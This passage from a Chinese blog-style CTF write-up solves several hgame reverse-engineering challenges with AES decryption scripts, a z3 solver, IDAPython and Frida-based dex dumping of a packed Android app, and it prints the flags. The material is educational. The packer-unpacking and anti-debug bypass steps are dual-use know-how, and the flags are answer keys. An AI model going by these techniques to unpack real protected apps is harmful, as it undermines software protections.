class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6'</span></span><br><span class="line">    key = bytes.fromhex(key)                            </span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'99c6bd34c31b78b4c4b964a7745e6300'</span></span><br><span class="line">    iv = bytes.fromhex(iv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">        <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span></span><br><span class="line">flag = AesEncry().decrypt(enc)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>首先输入pass1的逻辑，转化一个128位的大数与指定大数比较，然后以挂起创建自身进程的子进程，调用CreateFileMappingA()函数把文件映像到内存，再使用MapViewOfFile()函数把文件视映像到进程地址空间上（用于把当前进程的内存空间的数据与子进程共享），然后在非调试状态下对要共享的数据简单的异或加密一下，最后恢复启动刚刚创建的子进程，自身进程睡眠挂起：</p><p><img src="https://i.loli.net/2021/02/27/kRrY7a6meKp59Pz.png" alt="image-20210215190636690"></p><p>子进程启动后，调用OpenFileMappingA()与MapViewOfFile()查看父进程共享的内存数据，若存在则调用输入pass2的逻辑，然后一个cbc模式的aes加密。</p><p><img src="https://i.loli.net/2021/02/27/Gna2KV58FQRH7oc.png" alt="image-20210215191030835"></p><p>使用python解密一下得到pass2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'2b0c5e6a3a20b189'</span></span><br><span class="line">key = [key[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">key = bytes(key)</span><br><span class="line"><span class="comment">#key = bytes.fromhex(key)                            </span></span><br><span class="line"></span><br><span class="line">iv = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line">iv = bytes(iv)</span><br><span class="line"><span class="comment">#iv = bytes.fromhex(iv)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">    cryptos = AES.new(self.key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    cryptos = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrpytBytes = base64.b64decode(data)</span><br><span class="line">    plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">    <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'t/7+2Qd2eWU/Tl9i1QL2fg=='</span></span><br><span class="line">flag = decrypt(enc)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p>最后：<strong>hgame{2b0c5e6a3a20b189_7a4ad6c5671fb313}</strong></p><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>nc连上后，空格加回车进行单步调试。</p><p>容易发现，是对输入一位一位的异或加密后与指定值比较，不对则退出。</p><p><img src="https://i.loli.net/2021/02/27/SMEapnGisTgZIWl.png" alt="image-20210216180859920"></p><p>开始的格式是知道的，所以后面一位一位慢慢的跟一下就好了。</p><p><strong>hgame{You_Kn0w_debuGg3r}</strong></p><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>jadx反编译后没有发现MainActivity，但从几个特征可以知道app进行梆梆加固免费版进行加固。</p><p><img src="https://i.loli.net/2021/02/27/3xWMP72bsnJ89qe.png" alt="image-20210227105625088"></p><p>我们的目的主要是得到解密后的关键dex分析MainActivity，所以可以直接考虑用frida-dumpdex来dump出内存中的dex。项目地址：<a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>搭建frida环境时注意一点：安装的frida的版本要和服务端安装的frida-server版本要一致。</p><p>dump出dex后从到小的拖进jeb中反编译，0xbf03a000.dex是我们要找的。</p><p>可以看到，创建了多个线程进行操作。</p><p><img src="https://i.loli.net/2021/02/27/r6JaDQfPuLT7qCH.png" alt="image-20210227111613020"></p><p>看一下功能：</p><p><img src="https://i.loli.net/2021/02/27/johwg4l5qzErmNb.png" alt="image-20210227111754345"></p><p>继续看fd.i方法：</p><p><img src="https://i.loli.net/2021/02/27/ZiAxb93RSNz7Foa.png" alt="image-20210227112014590"></p><p>到这里基本上就可以知道，是开启多个线程进行发送数据，然后每个线程有不同的睡眠时间，这就有了先后顺序。</p><p>我是直接把所有数据按时间建立关系后，打印出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0xfffffff</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a[<span class="number">19530</span>] = <span class="string">'q'</span>, a[<span class="number">0x75F4</span>] = <span class="string">'e'</span>, a[<span class="number">0xA161</span>] = <span class="string">'d'</span>, a[<span class="number">7337</span>] = <span class="string">'f'</span>;</span><br><span class="line">a[<span class="number">0x5B0D</span>] = <span class="string">'e'</span>, a[<span class="number">0xC266</span>] = <span class="string">'x'</span>, a[<span class="number">0x887F</span>] = <span class="string">'q'</span>, a[<span class="number">50475</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">0xC05D</span>] = <span class="string">'a'</span>, a[<span class="number">0x909B</span>] = <span class="string">'u'</span>, a[<span class="number">8488</span>] = <span class="string">'a'</span>, a[<span class="number">0xC1CF</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">78545</span>] = <span class="string">'0'</span>, a[<span class="number">0x4B4C</span>] = <span class="string">'t'</span>, a[<span class="number">0xC807</span>] = <span class="string">'q'</span>, a[<span class="number">0x8C9B</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xB2B3</span>] = <span class="string">'k'</span>, a[<span class="number">2390</span>] = <span class="string">'z'</span>, a[<span class="number">0x568B</span>] = <span class="string">' '</span>, a[<span class="number">70963</span>] = <span class="string">'y'</span>;</span><br><span class="line">a[<span class="number">0xAF2B</span>] = <span class="string">' '</span>, a[<span class="number">0x397B</span>] = <span class="string">'d'</span>, a[<span class="number">10110</span>] = <span class="string">' '</span>, a[<span class="number">0xFE0D</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">0x33DE</span>] = <span class="string">'q'</span>, a[<span class="number">0xE105</span>] = <span class="string">' '</span>, a[<span class="number">40315</span>] = <span class="string">'b'</span>, a[<span class="number">79438</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x54C2</span>] = <span class="string">'e'</span>, a[<span class="number">0xD115</span>] = <span class="string">'y'</span>, a[<span class="number">0x84B9</span>] = <span class="string">'x'</span>, a[<span class="number">0xE4B4</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">28084</span>] = <span class="string">'f'</span>, a[<span class="number">83607</span>] = <span class="string">'&#125;'</span>, a[<span class="number">0x312F</span>] = <span class="string">'e'</span>, a[<span class="number">0x142F0</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">50828</span>] = <span class="string">'z'</span>, a[<span class="number">79540</span>] = <span class="string">'_'</span>, a[<span class="number">60636</span>] = <span class="string">'m'</span>, a[<span class="number">20891</span>] = <span class="string">'b'</span>;</span><br><span class="line">a[<span class="number">0x41D8</span>] = <span class="string">'a'</span>, a[<span class="number">0x18FC</span>] = <span class="string">'m'</span>, a[<span class="number">0xE91A</span>] = <span class="string">'r'</span>, a[<span class="number">0x13F0F</span>] = <span class="string">'I'</span>;</span><br><span class="line">a[<span class="number">0x70B8</span>] = <span class="string">'t'</span>, a[<span class="number">4741</span>] = <span class="string">'m'</span>, a[<span class="number">30778</span>] = <span class="string">' '</span>, a[<span class="number">0xEFA</span>] = <span class="string">'g'</span>;</span><br><span class="line">a[<span class="number">11980</span>] = <span class="string">'q'</span>, a[<span class="number">5130</span>] = <span class="string">'p'</span>, a[<span class="number">0x7F0</span>] = <span class="string">'a'</span>, a[<span class="number">0x13FA7</span>] = <span class="string">'0'</span>;</span><br><span class="line">a[<span class="number">0x4127</span>] = <span class="string">' '</span>, a[<span class="number">0x10D66</span>] = <span class="string">'Q'</span>, a[<span class="number">0x54A</span>] = <span class="string">'O'</span>, a[<span class="number">0xDBA0</span>] = <span class="string">'s'</span>;</span><br><span class="line">a[<span class="number">0x10EE1</span>] = <span class="string">'h'</span>, a[<span class="number">70302</span>] = <span class="string">'x'</span>, a[<span class="number">0x11C08</span>] = <span class="string">'n'</span>, a[<span class="number">0x4831</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0xE33C</span>] = <span class="string">'t'</span>, a[<span class="number">0xFAF4</span>] = <span class="string">' '</span>, a[<span class="number">80538</span>] = <span class="string">'i'</span>, a[<span class="number">0xF4E1</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">22890</span>] = <span class="string">'u'</span>, a[<span class="number">0x803B</span>] = <span class="string">'m'</span>, a[<span class="number">0x655B</span>] = <span class="string">'d'</span>, a[<span class="number">0xDC3A</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x3599</span>] = <span class="string">'o'</span>, a[<span class="number">44072</span>] = <span class="string">'k'</span>, a[<span class="number">0xB205</span>] = <span class="string">'N'</span>, a[<span class="number">0xBB43</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">80939</span>] = <span class="string">'7'</span>, a[<span class="number">0x3F07</span>] = <span class="string">'f'</span>, a[<span class="number">52068</span>] = <span class="string">'o'</span>, a[<span class="number">0xCAA2</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">72519</span>] = <span class="string">'_'</span>, a[<span class="number">0x11F52</span>] = <span class="string">'k'</span>, a[<span class="number">0x3CA5</span>] = <span class="string">'q'</span>, a[<span class="number">75894</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">0xF723</span>] = <span class="string">'e'</span>, a[<span class="number">0x7221</span>] = <span class="string">'u'</span>, a[<span class="number">0x2FCD</span>] = <span class="string">' '</span>, a[<span class="number">3501</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x9168</span>] = <span class="string">'e'</span>, a[<span class="number">0x8DC6</span>] = <span class="string">' '</span>, a[<span class="number">0x100CF</span>] = <span class="string">'s'</span>, a[<span class="number">0xCD51</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">0x10B56</span>] = <span class="string">'d'</span>, a[<span class="number">0x6ABD</span>] = <span class="string">' '</span>, a[<span class="number">0x103F7</span>] = <span class="string">'y'</span>, a[<span class="number">60485</span>] = <span class="string">'x'</span>;</span><br><span class="line">a[<span class="number">0x9589</span>] = <span class="string">'u'</span>, a[<span class="number">0x1105E</span>] = <span class="string">'3'</span>, a[<span class="number">54002</span>] = <span class="string">'b'</span>, a[<span class="number">0x12C3F</span>] = <span class="string">'1'</span>;</span><br><span class="line">a[<span class="number">0x6750</span>] = <span class="string">','</span>, a[<span class="number">0xBFCB</span>] = <span class="string">' '</span>, a[<span class="number">70562</span>] = <span class="string">'_'</span>, a[<span class="number">0xE66F</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">47203</span>] = <span class="string">'q'</span>, a[<span class="number">0x4994</span>] = <span class="string">'f'</span>, a[<span class="number">0xF098</span>] = <span class="string">'s'</span>, a[<span class="number">0xC131</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x16FB</span>] = <span class="string">'g'</span>, a[<span class="number">74919</span>] = <span class="string">'z'</span>, a[<span class="number">0xA96B</span>] = <span class="string">' '</span>, a[<span class="number">0x4558</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x222F</span>] = <span class="string">'z'</span>, a[<span class="number">0xAAD0</span>] = <span class="string">'n'</span>, a[<span class="number">0x9841</span>] = <span class="string">'z'</span>, a[<span class="number">71894</span>] = <span class="string">'3'</span>;</span><br><span class="line">a[<span class="number">0x8AF0</span>] = <span class="string">'s'</span>, a[<span class="number">0x2BFF</span>] = <span class="string">'t'</span>, a[<span class="number">0x525F</span>] = <span class="string">'b'</span>, a[<span class="number">0x9995</span>] = <span class="string">'e'</span>;</span><br><span class="line">a[<span class="number">68035</span>] = <span class="string">'&#123;'</span>, a[<span class="number">0xA375</span>] = <span class="string">'q'</span>, a[<span class="number">10949</span>] = <span class="string">'f'</span>, a[<span class="number">0x63DD</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xA621</span>] = <span class="string">'p'</span>, a[<span class="number">78398</span>] = <span class="string">'_'</span>, a[<span class="number">0x10780</span>] = <span class="string">'q'</span>, a[<span class="number">0x609E</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">9603</span>] = <span class="string">'!'</span>, a[<span class="number">0x7E5F</span>] = <span class="string">'t'</span>, a[<span class="number">0x83C0</span>] = <span class="string">'x'</span>, a[<span class="number">0x8A6D</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x1309A</span>] = <span class="string">'3'</span>, a[<span class="number">0xB8F4</span>] = <span class="string">'O'</span>, a[<span class="number">54430</span>] = <span class="string">'m'</span>, a[<span class="number">0x143CF</span>] = <span class="string">'w'</span>;</span><br><span class="line">a[<span class="number">40499</span>] = <span class="string">'u'</span>, a[<span class="number">0xD882</span>] = <span class="string">'u'</span>, a[<span class="number">0xB5DB</span>] = <span class="string">'f'</span>, a[<span class="number">0x931B</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0x1FB0</span>] = <span class="string">'u'</span>, a[<span class="number">0xF2F2</span>] = <span class="string">' '</span>, a[<span class="number">0x5031</span>] = <span class="string">'m'</span>, a[<span class="number">0x12720</span>] = <span class="string">'4'</span>;</span><br><span class="line">a[<span class="number">0x6649</span>] = <span class="string">'q'</span>, a[<span class="number">0xBCA1</span>] = <span class="string">'R'</span>, a[<span class="number">24004</span>] = <span class="string">' '</span>, a[<span class="number">0x10180</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">77170</span>] = <span class="string">'h'</span>, a[<span class="number">0x7B3C</span>] = <span class="string">'o'</span>, a[<span class="number">3019</span>] = <span class="string">'s'</span>, a[<span class="number">20120</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">74113</span>] = <span class="string">'_'</span>, a[<span class="number">0xDD23</span>] = <span class="string">','</span>, a[<span class="number">58044</span>] = <span class="string">'f'</span>, a[<span class="number">79659</span>] = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xfffffff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line"><span class="built_in">putchar</span>(a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<strong>Oazsdgmpgmfuaz! ftq eqodqf ar ftq mbbe ue tqdq, ftue otmxxqzsq ue uzebudqp nk NkfqOFR arrxuzq omybmusz, ftq rxms ue tsmyq{dQh3x_y3_nk_z4F1h3_0d_zi7I0dw}</strong>，可以看到最后和flag的格式是一样的了，字符数都是一样的，整个字符串的特征猜测凯撒加密。</p><p>从位移12得到结果：</p><p><img src="https://i.loli.net/2021/02/27/ruso9GQJk7PqxYE.png" alt="image-20210227112643799"></p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>开始没注意，以为就是考下z3的使用，且题目中有提示：<strong>Try angr or z3.</strong>，上来就把36个方程组去写z3，没有发现解。。也可能是我的约束条件写错了。。</p><p>之后注意到题目名字fake，进而看了看程序，发现一个获取TracerPid的反调试和紧接着的smc：</p><p><img src="https://i.loli.net/2021/02/27/UxcMZYkvEy4TsDh.png" alt="image-20210217162653310"></p><p>自己查看一下非调试运行时的状态：<br><img src="https://i.loli.net/2021/02/27/rS7LQ2zW3DjHcZx.png" alt="image-20210217162839393"></p><p>使用idapython或调试到smc后的代码，其实就是2个矩阵的乘法：</p><p><img src="https://i.loli.net/2021/02/27/VhjmxeSoF9OPayk.png" alt="image-20210217163037584"></p><p>先z3解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">'flag[%d]'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>, <span class="number">64</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">83</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span>]</span><br><span class="line">ans = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">ans[<span class="number">6</span>*i+j] += a[<span class="number">6</span>*k+j] * flag[<span class="number">6</span>*i+k]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">s.add(b[<span class="number">6</span>*i+j] == ans[<span class="number">6</span>*i+j])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">flag = [s.model()[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">print(bytes(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"unsat"</span>)</span><br><span class="line"><span class="comment">#hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><p>再使用sage求解看，实质就是先求得一个逆矩阵然后与enc组成的矩阵做乘法。</p><p><img src="https://i.loli.net/2021/02/27/hPdyLxSuDFpTRZE.png" alt="image-20210217163948621"></p><h3 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h3><p>一血。</p><p>开始每管题目的提示信息，直接静态分析了下，看见创建了一个线程，后面开始注册窗口各种操作，然后越看越复杂，定位到这个函数，有iv，key和加密解密操作，从常量识别出是tea类的加密算法？但这个也无从下手，程序中好像没调用这里。。。</p><p><img src="https://i.loli.net/2021/02/27/gdX7jNlDYhB2fJv.png" alt="image-20210217164757847"></p><p>嗯，，回到题目开始看提示信息：开发者留下了调试信息，试试DbgView。就试试吧。</p><p>可以发现，每次输入都会输出相应的响应：</p><p><img src="https://i.loli.net/2021/02/27/6AUTcPakH9fLeiq.png" alt="image-20210217165042094"></p><p>这里我直接去定位input length，因为之前静态分析时看见过。</p><p><img src="https://i.loli.net/2021/02/27/vicGJT4f5utmgY9.png" alt="image-20210217165253173"></p><p>其实上面这个整个函数就是关键了，简单看下汇编，结合DbgView。</p><p>输入长度为20，每一位先和0xff进行异或运算，最后来个rc4加密再和密文比较。<strong>注意：输入的是每个字符的order值，从DbgView可以查看。</strong></p><p>我直接附加调试得到内存信息，然后idapython得到order值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7FF7E35B5820</span></span><br><span class="line">addr1 = <span class="number">0x07FF7E35A3720</span></span><br><span class="line">flag = []</span><br><span class="line">s = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>]</span><br><span class="line">s = [i^<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += [(s[i]^get_byte(addr) ^ get_byte(addr1)) ^<span class="number">0xff</span>]</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">    addr1 += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>最后用C语言写一个置表得到输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">59</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">26</span>, <span class="number">31</span>,</span><br><span class="line"> <span class="number">61</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">24</span>, <span class="number">40</span>, <span 